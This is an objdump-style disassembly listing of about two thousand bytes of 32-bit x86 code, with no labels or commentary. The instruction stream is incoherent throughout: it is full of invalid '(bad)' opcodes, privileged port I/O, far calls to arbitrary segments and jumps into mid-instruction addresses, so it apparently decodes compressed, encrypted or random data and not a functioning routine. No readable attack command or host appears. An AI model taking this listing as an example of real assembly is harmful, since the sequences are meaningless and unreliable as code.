  4250a7:	icebp  
  4250a8:	pop    ebp
  4250a9:	test   DWORD PTR ds:0xcd03f7e1,esp
  4250af:	mov    WORD PTR [edi],es
  4250b1:	sub    eax,0x91bb8ac
  4250b6:	sar    DWORD PTR [ebx+0x15],1
  4250b9:	jnp    0x42509a
  4250bb:	ins    BYTE PTR es:[edi],dx
  4250bc:	mov    dh,0xcf
  4250be:	shr    DWORD PTR [edx-0x12],cl
  4250c1:	mov    ebx,0x3d1d97c7
  4250c6:	sub    DWORD PTR [ecx+0x13],0xffffffe6
  4250ca:	hlt    
  4250cb:	out    0xea,al
  4250cd:	rcl    DWORD PTR [ebx+ebp*4],cl
  4250d0:	pop    esp
  4250d1:	xchg   edi,eax
  4250d2:	out    dx,eax
  4250d3:	sahf   
  4250d4:	xchg   esp,eax
  4250d5:	lea    ebx,[edi-0x61]
  4250d8:	sub    esi,eax
  4250da:	mov    edx,0x8ec8b912
  4250df:	ret    
  4250e0:	pop    ds
  4250e1:	push   cs
  4250e2:	(bad)  
  4250e3:	mov    dl,0xbd
  4250e5:	adc    eax,0x15bab10f
  4250ea:	or     bh,bh
  4250ec:	cmp    esp,eax
  4250ee:	xchg   BYTE PTR [ecx+0x79],ah
  4250f1:	js     0x4250dd
  4250f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250f4:	(bad)  
  4250f5:	push   0x4b23d925
  4250fa:	xlat   BYTE PTR ds:[ebx]
  4250fb:	pusha  
  4250fc:	aaa    
  4250fd:	pop    ds
  4250fe:	in     al,dx
  4250ff:	pop    esp
  425100:	hlt    
  425101:	std    
  425102:	xor    esi,DWORD PTR [ecx]
  425104:	adc    dl,BYTE PTR [ebx-0x24de936]
  42510a:	clc    
  42510b:	xor    esp,DWORD PTR [edx+ebx*2-0x16]
  42510f:	push   edi
  425110:	stc    
  425111:	addr16 push 0x31
  425114:	adc    BYTE PTR [esi+0x7c],al
  425117:	jne    0x42510b
  425119:	addr16 mov ch,0x69
  42511c:	inc    edx
  42511d:	sub    al,0x5d
  42511f:	js     0x4250b3
  425121:	push   esp
  425122:	jae    0x425161
  425124:	and    cl,BYTE PTR fs:[edi]
  425127:	pop    ss
  425128:	and    BYTE PTR [ebx],al
  42512a:	lods   al,BYTE PTR ds:[esi]
  42512b:	xchg   ecx,eax
  42512c:	pop    esi
  42512d:	jmp    0x15044665
  425132:	jbe    0x425163
  425134:	out    0x20,eax
  425136:	aad    0xa6
  425138:	mov    ch,0xa3
  42513a:	call   0xb9ff:0x37368178
  425141:	pop    ecx
  425142:	adc    eax,DWORD PTR [edx-0x1c]
  425145:	loop   0x425153
  425147:	and    edi,eax
  425149:	mov    ch,0x5d
  42514b:	mov    edx,0xf1822233
  425150:	xchg   ebp,eax
  425151:	(bad)  
  425152:	jp     0x4251be
  425154:	(bad)  
  425155:	scas   al,BYTE PTR es:[edi]
  425156:	xchg   esp,eax
  425157:	les    esi,FWORD PTR [ecx-0x54]
  42515a:	sub    BYTE PTR [esi],dh
  42515c:	jecxz  0x4250f2
  42515e:	adc    eax,DWORD PTR [esi+0xe]
  425161:	out    dx,eax
  425162:	push   ecx
  425163:	cmp    al,0x9
  425165:	rol    al,0x89
  425168:	mov    bl,0xc1
  42516a:	aas    
  42516b:	fcomp  DWORD PTR [edx]
  42516d:	ss ret 
  42516f:	out    dx,eax
  425170:	cmp    ch,BYTE PTR [edi]
  425172:	in     eax,dx
  425173:	test   DWORD PTR [ebx+0x5d2e295f],esp
  425179:	jb     0x4250fc
  42517b:	das    
  42517c:	popa   
  42517d:	push   esi
  42517e:	xchg   edi,eax
  42517f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425180:	add    edx,DWORD PTR [ebx-0x36]
  425183:	or     edx,DWORD PTR [edx+ebx*1]
  425186:	neg    BYTE PTR [esi+0x315407dc]
  42518c:	mov    ecx,0xd99a504e
  425191:	fisttp WORD PTR [edi+0x5f508c63]
  425197:	jmp    0x20501ce6
  42519c:	sbb    ebx,esp
  42519e:	stos   BYTE PTR es:[edi],al
  42519f:	mov    ds:0xc2a09ef9,eax
  4251a4:	sbb    edi,DWORD PTR [edi-0x17]
  4251a7:	ret    0xbd3
  4251aa:	adc    DWORD PTR [esi+0x42],edx
  4251ad:	fimul  DWORD PTR [edi-0x1f5e6a2d]
  4251b3:	push   edi
  4251b4:	mov    bl,0x10
  4251b6:	out    0xa0,al
  4251b8:	out    0x7a,eax
  4251ba:	out    dx,eax
  4251bb:	mov    WORD PTR [eax+0x2bd5e0f0],es
  4251c1:	mov    bh,0xc7
  4251c3:	ins    BYTE PTR es:[edi],dx
  4251c4:	and    DWORD PTR ds:0xb369d1ab,ebx
  4251ca:	shl    BYTE PTR [ecx-0x4f],1
  4251cd:	and    edx,DWORD PTR [ecx-0x19]
  4251d0:	fisubr DWORD PTR [edx]
  4251d2:	lods   eax,DWORD PTR ds:[esi]
  4251d3:	mov    esp,0xb8f36d7f
  4251d8:	dec    ecx
  4251d9:	sub    BYTE PTR [ebp+edi*2+0x20],bh
  4251dd:	push   0xfffffff0
  4251df:	or     BYTE PTR [edi+0xb],0x84
  4251e3:	(bad)  
  4251e4:	mov    dl,0x19
  4251e6:	test   al,0x35
  4251e8:	and    eax,0x6ec8e1e1
  4251ed:	rol    DWORD PTR [ebp+0x26],cl
  4251f0:	or     esp,DWORD PTR [ecx]
  4251f2:	call   0x3f8:0xf9026b12
  4251f9:	gs aad 0x29
  4251fc:	mov    bl,BYTE PTR [edi-0xed52271]
  425202:	push   cs
  425203:	pop    edi
  425204:	and    edx,0x1ca5cb1e
  42520a:	mov    dl,0xda
  42520c:	nop
  42520d:	in     al,0x57
  42520f:	nop
  425210:	mov    bh,0x65
  425212:	test   ecx,ecx
  425214:	(bad)  
  425215:	(bad)  
  425216:	imul   edx,DWORD PTR [edx+0x57],0xffffffda
  42521a:	jge    0x425274
  42521c:	mov    al,ds:0x86ce98fd
  425221:	js     0x42521a
  425223:	pop    ecx
  425224:	push   esp
  425225:	lds    esi,FWORD PTR [edx]
  425227:	mov    ebx,0x95aa5505
  42522c:	in     eax,dx
  42522d:	mov    bh,0x5f
  42522f:	loopne 0x4251c1
  425231:	inc    edx
  425232:	pop    eax
  425233:	or     bl,BYTE PTR [eax]
  425235:	into   
  425236:	lods   eax,DWORD PTR ds:[esi]
  425237:	cmp    DWORD PTR [eax+0xb],ebx
  42523a:	push   ebp
  42523b:	inc    ecx
  42523c:	jmp    0x42529b
  42523e:	mov    ds:0xe0ba2f4f,eax
  425243:	test   BYTE PTR [eax],dl
  425245:	mov    al,0x4
  425247:	jg     0x4252a6
  425249:	inc    edx
  42524a:	dec    eax
  42524b:	imul   esp,esp,0xf3111910
  425251:	mov    esp,0xb6b297ef
  425256:	inc    edi
  425257:	out    dx,eax
  425258:	dec    ebx
  425259:	mov    ebp,0xfd92d1e2
  42525e:	imul   esp,DWORD PTR [edi+0x72],0xffffffe6
  425262:	hlt    
  425263:	pop    ecx
  425264:	and    BYTE PTR [edi-0x64],al
  425267:	js     0x42520c
  425269:	pop    ebx
  42526a:	shl    DWORD PTR [ebx+0x6f81001],cl
  425270:	cmp    BYTE PTR [ebx-0x5b695f21],al
  425276:	outs   dx,BYTE PTR ds:[esi]
  425277:	or     eax,0xc42ac507
  42527c:	lds    esp,FWORD PTR [edx]
  42527e:	mov    ch,0xfd
  425280:	adc    eax,0x8a86d803
  425285:	xor    al,0xb4
  425287:	dec    esp
  425288:	mov    WORD PTR [edx+0x77],es
  42528b:	ins    BYTE PTR es:[edi],dx
  42528c:	scas   eax,DWORD PTR es:[edi]
  42528d:	retf   
  42528e:	mov    gs,WORD PTR [eax]
  425290:	aaa    
  425291:	je     0x425278
  425293:	clc    
  425294:	loopne 0x4252b9
  425296:	mov    eax,ds:0xc0b49ef1
  42529b:	xchg   edx,eax
  42529c:	and    eax,0x7612a7cc
  4252a1:	dec    edi
  4252a2:	lea    ecx,[edx+0x43]
  4252a5:	pop    esp
  4252a6:	add    al,0x18
  4252a8:	bound  esi,QWORD PTR [edi]
  4252aa:	sbb    BYTE PTR [edx+0x3237eb8a],0xfc
  4252b1:	es repz jle 0x42529b
  4252b5:	popa   
  4252b6:	retf   0x449e
  4252b9:	mov    edx,0x1d788640
  4252be:	sar    BYTE PTR [eax],1
  4252c0:	outs   dx,BYTE PTR ds:[esi]
  4252c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252c2:	dec    edi
  4252c3:	add    eax,DWORD PTR [edx-0x3dacd222]
  4252c9:	ror    BYTE PTR [edx+ebx*2],cl
  4252cc:	retf   
  4252cd:	or     al,0x2b
  4252cf:	cmp    BYTE PTR [eax+ebp*2],0xb4
  4252d3:	and    bh,BYTE PTR [edi]
  4252d5:	stos   DWORD PTR es:[edi],eax
  4252d6:	jg     0x42529c
  4252d8:	es mov cl,0x93
  4252db:	xchg   esp,eax
  4252dc:	adc    DWORD PTR [eax+0x1a8f3fdf],esp
  4252e2:	add    ch,cl
  4252e4:	aas    
  4252e5:	loop   0x425348
  4252e7:	adc    dh,BYTE PTR [ecx]
  4252e9:	nop
  4252ea:	inc    ebp
  4252eb:	or     DWORD PTR [edx+0x43ff1555],esp
  4252f1:	inc    ebp
  4252f2:	xlat   BYTE PTR ds:[ebx]
  4252f3:	not    BYTE PTR ds:0x14845ed4
  4252f9:	fisub  WORD PTR [edi+0x65]
  4252fc:	mov    esp,esp
  4252fe:	lods   al,BYTE PTR ds:[esi]
  4252ff:	push   ss
  425300:	enter  0xe1c6,0xe9
  425304:	pusha  
  425305:	test   DWORD PTR [ebp+0x51f8697],edi
  42530b:	(bad)  
  42530c:	js     0x425290
  42530e:	aam    0x18
  425310:	inc    ebp
  425311:	test   al,0x84
  425313:	and    BYTE PTR [edx+0x2333aacb],0xc4
  42531a:	push   edi
  42531b:	js     0x42537f
  42531d:	cmc    
  42531e:	fist   WORD PTR [esi]
  425320:	xor    bh,BYTE PTR [ecx+0x38]
  425323:	push   ebp
  425324:	sbb    al,0x44
  425326:	cdq    
  425327:	push   esi
  425328:	jmp    0x4253a2
  42532a:	mov    al,0x53
  42532c:	sbb    BYTE PTR [ebx],bh
  42532e:	fcmovnu st,st(4)
  425330:	rcr    dh,0x1f
  425333:	dec    eax
  425334:	add    edx,eax
  425336:	call   0x6fc:0x83c856ef
  42533d:	aam    0x57
  42533f:	lahf   
  425340:	call   0x9de9:0x8fb93b55
  425347:	bound  ebx,QWORD PTR [ebp+0x69ab5bad]
  42534d:	sub    al,ch
  42534f:	pop    esp
  425350:	mov    ds:0xd6330a9d,al
  425355:	mov    BYTE PTR [edi],dl
  425357:	enter  0xb247,0xce
  42535b:	outs   dx,BYTE PTR ds:[esi]
  42535c:	jo     0x4252e9
  42535e:	cwde   
  42535f:	test   al,0x9b
  425361:	loop   0x425365
  425363:	daa    
  425364:	adc    dl,dl
  425366:	mov    eax,0x50577459
  42536b:	mov    bl,0xd4
  42536d:	cmp    DWORD PTR [eax+0x18],esp
  425370:	xchg   ebx,eax
  425371:	rol    DWORD PTR [edi+0x3349d708],cl
  425377:	cmp    ebp,DWORD PTR [eax-0x6d70fdcc]
  42537d:	int3   
  42537e:	dec    edx
  42537f:	sub    al,0x0
  425381:	add    bl,al
  425383:	and    ecx,edx
  425385:	dec    eax
  425386:	repz clc 
  425388:	fld    TBYTE PTR [ebx+0x202892a0]
  42538e:	idiv   DWORD PTR [ecx-0x395f49b0]
  425394:	add    DWORD PTR [eax],eax
  425396:	add    eax,DWORD PTR es:[eax]
  425399:	add    BYTE PTR [ebx+edi*1],dl
  42539c:	sub    DWORD PTR [ebx+0xb],ebx
  42539f:	xor    eax,0x1804f083
  4253a4:	out    dx,al
  4253a5:	gs js  0x42535d
  4253a8:	or     al,0x33
  4253aa:	aad    0x66
  4253ac:	cmp    al,0xd3
  4253ae:	add    eax,0xab1034e1
  4253b3:	xor    dl,bl
  4253b5:	jmp    FWORD PTR [edi+eiz*8-0x32]
  4253b9:	inc    edx
  4253ba:	mov    dl,0x1e
  4253bc:	shl    DWORD PTR [edi+esi*8],0x57
  4253c0:	jb     0x425387
  4253c2:	aam    0xdb
  4253c4:	jns    0x4253f4
  4253c6:	ret    0x2a93
  4253c9:	dec    edi
  4253ca:	jecxz  0x425446
  4253cc:	sti    
  4253cd:	icebp  
  4253ce:	push   0x36
  4253d0:	cdq    
  4253d1:	mov    ebp,0xc6a92adb
  4253d6:	mov    al,ds:0x5ea22ba
  4253db:	shr    BYTE PTR ds:0xf482385a,1
  4253e1:	sbb    BYTE PTR [ebp*8+0x7feb6dfc],bh
  4253e8:	sub    BYTE PTR [ebp-0x42],0x71
  4253ec:	mov    ah,0x98
  4253ee:	(bad)  
  4253ef:	jmp    0x42541c
  4253f1:	mov    esi,0xb2e6c487
  4253f6:	bound  ebp,QWORD PTR [eax+0x32]
  4253f9:	pop    ecx
  4253fa:	mov    eax,0x6896c60f
  4253ff:	xchg   ebx,eax
  425400:	sar    DWORD PTR [edx+0x3e],1
  425403:	fcmovnb st,st(4)
  425405:	adc    DWORD PTR [eax],edx
  425407:	inc    ebx
  425408:	ja     0x42546e
  42540a:	pop    edx
  42540b:	xchg   ebp,eax
  42540c:	dec    esp
  42540d:	jg     0x4253f7
  42540f:	enter  0xa316,0xb9
  425413:	js     0x4253ae
  425415:	inc    eax
  425416:	dec    ebx
  425417:	mov    dl,0xe3
  425419:	out    0xb8,eax
  42541b:	in     al,0x98
  42541d:	das    
  42541e:	jle    0x4253d0
  425420:	push   cs
  425421:	test   al,0x6d
  425423:	push   ds
  425424:	push   0xe6762a4b
  425429:	mov    esp,0xfe4a8367
  42542e:	or     BYTE PTR [ebx-0x380b7a4],ah
  425434:	lds    ebx,FWORD PTR [eax]
  425436:	xor    al,0x6c
  425438:	add    DWORD PTR [ebx+esi*4+0x71],0x1e
  42543d:	sub    esp,DWORD PTR [edi+0x6e59d221]
  425443:	sub    ecx,DWORD PTR [esp+ebp*1]
  425446:	inc    edi
  425447:	xchg   edx,eax
  425448:	sbb    BYTE PTR [ecx-0xc],cl
  42544b:	pushf  
  42544c:	xchg   DWORD PTR [esi],esp
  42544e:	mov    ds:0x396711a5,al
  425453:	enter  0xf786,0x7
  425457:	fs jge 0x4254d3
  42545a:	jg     0x425448
  42545c:	add    eax,0x28ffd321
  425461:	push   ds
  425462:	push   esi
  425463:	addr16 lahf 
  425465:	daa    
  425466:	retf   0x19dc
  425469:	add    edi,DWORD PTR [eax-0x47]
  42546c:	mov    al,0xf2
  42546e:	mov    cl,0x11
  425470:	rcr    DWORD PTR [eax-0x4a],cl
  425473:	inc    esp
  425474:	gs mov bl,0xe4
  425477:	xchg   edx,eax
  425478:	dec    esi
  425479:	ds stc 
  42547b:	pop    eax
  42547c:	enter  0x9987,0xb5
  425480:	mov    edi,DWORD PTR [edx+0x791b3fe8]
  425486:	push   es
  425487:	addr16 dec edi
  425489:	jge    0x425443
  42548b:	scas   al,BYTE PTR es:[edi]
  42548c:	jb     0x42544d
  42548e:	loopne 0x42544a
  425490:	hlt    
  425491:	xchg   edi,eax
  425492:	bound  ebp,QWORD PTR [ebx]
  425494:	sbb    eax,0xb02c9032
  425499:	or     bh,BYTE PTR gs:[edx+0x744e43b]
  4254a0:	mov    ch,0x2
  4254a3:	les    cx,DWORD PTR [ecx-0x542e2a7d]
  4254aa:	iret   
  4254ab:	in     al,dx
  4254ac:	dec    ecx
  4254ad:	adc    bh,BYTE PTR ds:0xb5664432
  4254b3:	retf   
  4254b4:	mov    ecx,0x1c5e6625
  4254b9:	add    bl,ah
  4254bb:	xchg   edi,eax
  4254bc:	jae    0x4254d7
  4254be:	pop    esp
  4254bf:	call   0xc9952ee3
  4254c4:	ss pop esi
  4254c6:	adc    eax,0x1b99e693
  4254cb:	iret   
  4254cc:	cdq    
  4254cd:	adc    DWORD PTR [ecx+0x31fc1026],esi
  4254d3:	adc    eax,ecx
  4254d5:	sub    eax,0xeef4dd03
  4254da:	mov    ds:0x453b11fb,eax
  4254df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254e0:	jnp    0x4254f7
  4254e2:	cmp    DWORD PTR [esi],edi
  4254e4:	cli    
  4254e5:	cs clc 
  4254e7:	ja     0x42548e
  4254e9:	aas    
  4254ea:	mov    ds:0x7fb160fe,al
  4254ef:	out    0xf1,eax
  4254f1:	lods   eax,DWORD PTR cs:[esi]
  4254f3:	inc    ecx
  4254f4:	aad    0xef
  4254f6:	out    dx,eax
  4254f7:	jmp    0xa2d2630e
  4254fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254fd:	in     al,0xa6
  4254ff:	or     dh,BYTE PTR [eax+0x6b2d5288]
  425505:	push   0x4c
  425507:	ror    BYTE PTR [edx-0x157e172b],cl
  42550d:	jmp    0x1d5b2d01
  425512:	adc    ebp,esp
  425514:	and    eax,0x722c1b2f
  425519:	adc    BYTE PTR [ecx],dl
  42551b:	icebp  
  42551c:	add    cl,BYTE PTR ds:0x72d0dca1
  425522:	pop    edi
  425523:	jns    0x34daf0a6
  425529:	jne    0x42553a
  42552b:	xor    ah,BYTE PTR [eax+eiz*4-0x14d09a0f]
  425532:	adc    eax,0xbf20bbdd
  425537:	sub    dh,BYTE PTR [edx+0x6267d07e]
  42553d:	mov    edx,0xb3828f64
  425542:	ret    
  425543:	aaa    
  425544:	(bad)  [ebx]
  425546:	mov    esi,ecx
  425548:	mov    edi,DWORD PTR [ebx+0x26]
  42554b:	mov    eax,0x76fafa1e
  425550:	les    ecx,FWORD PTR [ebx-0x30]
  425553:	sbb    cl,BYTE PTR [edi-0x7f11d212]
  425559:	popa   
  42555a:	repz xor al,0x61
  42555d:	cmp    DWORD PTR ds:0x541dcfb5,esp
  425563:	mov    dh,0x3c
  425565:	xor    dh,BYTE PTR [edx-0x6c836b2b]
  42556b:	sbb    edx,0x17
  42556e:	mov    bl,0xb0
  425570:	leave  
  425571:	push   eax
  425572:	stc    
  425573:	loope  0x425551
  425575:	push   ebp
  425576:	out    0xf0,al
  425578:	not    ah
  42557a:	push   esp
  42557b:	mov    bh,0x2c
  42557d:	(bad)  
  42557e:	aas    
  42557f:	cld    
  425580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425581:	push   cs
  425582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425583:	sub    eax,0x550f3c7e
  425588:	pop    ebx
  425589:	call   0xea6a:0x1b0b0462
  425590:	adc    al,0xfa
  425592:	mov    ebx,0xab38c78b
  425597:	push   edi
  425598:	enter  0xaec9,0x1e
  42559c:	ret    0x424
  42559f:	ficom  DWORD PTR [esi]
  4255a1:	aas    
  4255a2:	xor    DWORD PTR [eax+0x2b],ebp
  4255a5:	pop    ebx
  4255a6:	and    eax,0x245fb60a
  4255ab:	add    DWORD PTR [esi+0x5b],edx
  4255ae:	or     eax,0xaca84a5f
  4255b3:	scas   al,BYTE PTR es:[edi]
  4255b4:	retf   0x4008
  4255b7:	adc    DWORD PTR [eax+0x7c2a67b6],0xf5037a0a
  4255c1:	sub    al,BYTE PTR [edi]
  4255c3:	retf   
  4255c4:	leave  
  4255c5:	pop    esp
  4255c6:	inc    esi
  4255c7:	sbb    al,0x83
  4255c9:	inc    ebx
  4255ca:	add    DWORD PTR [edx-0x637e6c15],ecx
  4255d0:	and    BYTE PTR [eax+0x6d94efa1],ah
  4255d6:	add    eax,0xd80511d
  4255db:	fild   QWORD PTR [ecx+0x3b]
  4255de:	lds    ebp,FWORD PTR [edx+0x21987deb]
  4255e4:	mov    ah,0xc1
  4255e6:	loopne 0x4255c8
  4255e8:	js     0x4255d9
  4255ea:	jb     0x425600
  4255ec:	ds fxch st(5)
  4255ef:	popf   
  4255f0:	inc    eax
  4255f1:	leave  
  4255f2:	mov    ecx,eax
  4255f4:	pop    eax
  4255f5:	jge    0x4255ef
  4255f7:	inc    eax
  4255f8:	test   BYTE PTR [edx-0x4c31dea9],0xa
  4255ff:	and    bh,BYTE PTR ds:0xb970710e
  425605:	pop    ss
  425606:	(bad)  
  425607:	in     al,0xae
  425609:	fs ret 
  42560b:	cmp    edx,ebp
  42560d:	jl     0x425672
  42560f:	aas    
  425610:	sub    bl,dl
  425612:	loope  0x4255a5
  425614:	dec    ax
  425616:	jne    0x42568f
  425618:	sub    bh,BYTE PTR [esi-0x2ad18ae0]
  42561e:	cmp    dh,BYTE PTR [edx+0x3c]
  425621:	sub    esp,eax
  425623:	hlt    
  425624:	xchg   ecx,eax
  425625:	aad    0xee
  425627:	popf   
  425628:	cmp    bh,bl
  42562a:	push   edx
  42562b:	cmp    DWORD PTR [ebp+eax*2+0x603c6324],eax
  425632:	xchg   edx,eax
  425633:	pop    ds
  425634:	mov    edi,0xe8ca8e02
  425639:	or     BYTE PTR [esi-0x4],0x87
  42563d:	js     0x425620
  42563f:	ja     0x42561b
  425641:	pusha  
  425642:	sbb    al,0x2b
  425644:	xchg   esp,eax
  425645:	cmp    ecx,DWORD PTR [edi-0x2869629e]
  42564b:	aas    
  42564c:	cld    
  42564d:	fiadd  DWORD PTR [ecx+eax*2-0x27bba218]
  425654:	jmp    0x28c:0x3bc7d9e2
  42565b:	ja     0x4256cc
  42565d:	ret    0x3483
  425660:	inc    esi
  425661:	mov    edi,esp
  425663:	and    dl,BYTE PTR [eax-0x3d765877]
  425669:	jle    0x425674
  42566b:	scas   al,BYTE PTR es:[edi]
  42566c:	xchg   ecx,eax
  42566d:	fisub  WORD PTR [edi+esi*4]
  425670:	adc    DWORD PTR [ebx-0x7c],edi
  425673:	outs   dx,DWORD PTR ds:[esi]
  425674:	(bad)  
  425675:	adc    BYTE PTR [ebx],dl
  425677:	or     bl,BYTE PTR [edx+ecx*4-0x6a56af8f]
  42567e:	outs   dx,BYTE PTR ds:[esi]
  42567f:	pop    esi
  425680:	aaa    
  425681:	outs   dx,DWORD PTR ds:[esi]
  425682:	pop    eax
  425683:	mov    eax,0xf9310c83
  425688:	jbe    0x4256d5
  42568a:	dec    edi
  42568b:	rol    DWORD PTR [ecx+0x8],0x58
  42568f:	outs   dx,DWORD PTR ds:[esi]
  425690:	sbb    esi,0xffffff9f
  425693:	xchg   ecx,eax
  425694:	push   esp
  425695:	data16 (bad) 
  425697:	hlt    
  425698:	push   0xfc70d83a
  42569d:	adc    edi,0xf179a20d
  4256a3:	rcr    BYTE PTR [edi-0x683a5125],1
  4256a9:	jo     0x4256cd
  4256ab:	jne    0x4256c0
  4256ad:	jbe    0x42564f
  4256af:	call   0xa69afc84
  4256b4:	add    dl,BYTE PTR [ecx+0x1e05102c]
  4256ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256bb:	js     0x4256f1
  4256bd:	test   BYTE PTR [esi-0x16],al
  4256c0:	add    BYTE PTR [eax],al
  4256c2:	call   0x9eff:0xefe9ef59
  4256c9:	jnp    0x42570e
  4256cb:	pop    ebp
  4256cc:	pop    esp
  4256cd:	mov    cl,0xe5
  4256cf:	mov    bh,0x73
  4256d1:	xor    al,dh
  4256d3:	leave  
  4256d4:	add    DWORD PTR [eax],eax
  4256d6:	add    eax,DWORD PTR es:[eax]
  4256d9:	add    BYTE PTR [ecx+0x61f5da94],cl
  4256df:	xchg   esp,eax
  4256e0:	das    
  4256e1:	jns    0x425696
  4256e3:	jno    0x4256bd
  4256e5:	or     dh,BYTE PTR [ecx-0x79]
  4256e8:	jle    0x425749
  4256ea:	push   ss
  4256eb:	sub    bl,ah
  4256ed:	ret    
  4256ee:	hlt    
  4256ef:	push   0x67480be9
  4256f4:	lahf   
  4256f5:	or     eax,0x8c402208
  4256fa:	and    ebp,eax
  4256fc:	arpl   bx,bp
  4256fe:	jbe    0x42568f
  425700:	and    al,0xd5
  425702:	jne    0x425746
  425704:	push   0xffffffe9
  425706:	mov    ds:0xac20c1be,al
  42570b:	push   ecx
  42570c:	aaa    
  42570d:	into   
  42570e:	jb     0x42575a
  425710:	data16 mov ch,0xf0
  425713:	mov    bl,0x2e
  425715:	das    
  425716:	(bad)  
  425717:	xchg   esp,eax
  425718:	jae    0x4256fb
  42571a:	pop    eax
  42571b:	lahf   
  42571c:	lods   al,BYTE PTR ds:[esi]
  42571d:	bound  ebx,QWORD PTR [ebx+0x5]
  425720:	inc    edx
  425721:	sar    dh,cl
  425723:	pop    eax
  425724:	and    BYTE PTR [ecx+ecx*8],bl
  425727:	sbb    DWORD PTR [ecx],esp
  425729:	in     eax,0xf0
  42572b:	jle    0x42575b
  42572d:	adc    WORD PTR [eax-0x2a],ax
  425731:	in     eax,0x80
  425733:	mul    DWORD PTR [edx+ebx*1]
  425736:	repz xor BYTE PTR [edx-0x39ec55f6],ch
  42573d:	sub    dl,al
  42573f:	nop
  425740:	out    0xe5,al
  425742:	(bad)  
  425743:	outs   dx,BYTE PTR ds:[esi]
  425744:	pop    edx
  425745:	mov    edx,0xcff0844
  42574a:	rcr    BYTE PTR [edx+0x2dbb1560],1
  425750:	xor    al,0x10
  425752:	push   ebp
  425753:	dec    ebx
  425754:	inc    ecx
  425755:	(bad)  
  425756:	addr16 push ebp
  425758:	cdq    
  425759:	imul   ebp,DWORD PTR [edx+0x4f],0xffffffc3
  42575d:	sbb    eax,0xfde21bee
  425762:	test   eax,0x5aec5b4
  425767:	inc    eax
  425768:	(bad)  
  425769:	dec    ebx
  42576a:	int3   
  42576b:	xrelease mov DWORD PTR [edx],edx
  42576e:	in     al,dx
  42576f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425770:	or     ebp,DWORD PTR [ebp-0x4f]
  425773:	shl    DWORD PTR [esi+0x7a2e2d3e],1
  425779:	adc    ch,BYTE PTR [esi+edi*1+0x17]
  42577d:	sahf   
  42577e:	ins    DWORD PTR es:[edi],dx
  42577f:	mov    bl,0xb7
  425781:	shl    DWORD PTR [esi+0x75678470],0xce
  425788:	sub    eax,0x7b5f590a
  42578d:	cmp    BYTE PTR [esi-0x49],bh
  425790:	aam    0x45
  425792:	(bad)  
  425793:	fcmove st,st(2)
  425795:	cdq    
  425796:	ins    BYTE PTR es:[edi],dx
  425797:	sar    DWORD PTR [eax],0xf2
  42579a:	inc    esi
  42579b:	cli    
  42579c:	fld    DWORD PTR [eax-0x4a]
  42579f:	xchg   ebp,eax
  4257a0:	loope  0x4257ce
  4257a2:	sub    eax,0x25007eed
  4257a7:	cmp    BYTE PTR [ecx-0x45be1e53],dl
  4257ad:	push   ebp
  4257ae:	mov    esp,DWORD PTR [edi-0x2fc23ddd]
  4257b4:	jg     0x425832
  4257b6:	mov    ah,0x8d
  4257b8:	pop    ds
  4257b9:	jb     0x4257f1
  4257bb:	(bad)  
  4257bc:	fcomp  DWORD PTR [ebp+0x8]
  4257bf:	sub    dl,ah
  4257c1:	gs mov bh,0x15
  4257c4:	adc    DWORD PTR [edi-0x57],eax
  4257c7:	sbb    BYTE PTR [esi],ah
  4257c9:	sbb    eax,0x7f11dfec
  4257ce:	in     al,0xc5
  4257d0:	es sub edx,eax
  4257d3:	mov    edi,0xb48f45e7
  4257d8:	cwde   
  4257d9:	fs icebp 
  4257db:	mov    edx,0xd8883dd
  4257e0:	cdq    
  4257e1:	xlat   BYTE PTR ds:[ebx]
  4257e2:	jne    0x425845
  4257e4:	jns    0x42580a
  4257e6:	xchg   edx,eax
  4257e7:	push   es
  4257e8:	push   cs
  4257e9:	popf   
  4257ea:	imul   esp,DWORD PTR [edi+0x14],0xffffffd5
  4257ee:	push   eax
  4257ef:	add    ah,dh
  4257f1:	sbb    DWORD PTR [ecx],esi
  4257f3:	push   edi
  4257f4:	hlt    
  4257f5:	cwde   
  4257f6:	mov    edx,0xf41d3388
  4257fb:	mov    esp,0xeda61c4a
  425800:	data16 sysexit 
  425803:	cs cdq 
  425805:	daa    
  425806:	ror    BYTE PTR gs:[esi-0x4df84b82],0xf6
  42580e:	out    dx,eax
  42580f:	cwde   
  425810:	cli    
  425811:	and    BYTE PTR [edi-0xb],dl
  425814:	fcom   QWORD PTR [ebp-0x188c25c6]
  42581a:	push   es
  42581b:	sbb    dh,cl
  42581d:	xchg   DWORD PTR [esi+edi*8],ecx
  425820:	mov    edx,edi
  425822:	push   ds
  425823:	push   ds
  425824:	(bad)  
  425826:	jb     0x4257af
  425828:	or     DWORD PTR [ebx+0x37c75a83],0xffffffe2
  42582f:	pop    ds
  425830:	lds    ebx,FWORD PTR [ebp-0x10d5c278]
  425836:	push   ss
  425837:	icebp  
  425838:	xor    BYTE PTR fs:[ecx],ch
  42583b:	sub    al,0xc7
  42583d:	xor    cl,BYTE PTR [ebp+0x5e]
  425840:	clc    
  425841:	xor    BYTE PTR [ecx],al
  425843:	xor    cl,dh
  425845:	sbb    eax,0xe5cccf8
  42584a:	lods   al,BYTE PTR ds:[esi]
  42584b:	fisubr DWORD PTR [edx+0x22]
  42584e:	shl    DWORD PTR [eax-0x7715d3a9],0x6b
  425855:	xor    esp,eax
  425857:	xor    ch,al
  425859:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42585b:	mov    ah,0xe9
  42585d:	sti    
  42585e:	dec    eax
  42585f:	fiadd  WORD PTR [ecx+0x3a699f6b]
  425865:	int3   
  425866:	dec    esi
  425867:	pop    ds
  425868:	sbb    DWORD PTR [eax],0xf51962d6
  42586e:	mov    eax,0xcac241fd
  425873:	adc    eax,0x3437f36b
  425878:	adc    BYTE PTR [eax-0x6a],dl
  42587b:	(bad)  
  42587c:	pop    ebx
  42587d:	mov    bl,al
  42587f:	add    esi,ebp
  425881:	push   ecx
  425882:	enter  0xe247,0xb9
  425886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425887:	and    esi,0x7c82dae8
  42588d:	dec    edx
  42588e:	out    dx,al
